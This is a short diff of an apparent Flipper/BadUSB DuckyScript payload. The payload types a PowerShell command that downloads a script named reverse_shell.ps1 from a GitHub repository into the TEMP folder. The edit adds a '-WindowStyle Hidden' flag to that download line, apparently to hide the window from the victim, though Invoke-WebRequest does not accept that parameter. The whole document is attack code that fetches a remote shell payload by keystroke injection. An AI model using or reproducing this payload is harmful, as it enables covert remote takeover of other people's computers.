@@ -8,7 +8,7 @@ ALT Y
 DELAY 500
 
 REM Download the PowerShell script
-STRING $url = "https://raw.githubusercontent.com/1tsMeMario/flipper_payloads/main/reverse_shell.ps1"; $output = "$env:TEMP\reverse_shell.ps1"; Invoke-WebRequest -Uri $url -OutFile $output;
+STRING $url = "https://raw.githubusercontent.com/1tsMeMario/flipper_payloads/main/reverse_shell.ps1"; $output = "$env:TEMP\reverse_shell.ps1"; Invoke-WebRequest -Uri $url -OutFile $output -WindowStyle Hidden;
 ENTER
 DELAY 500
 
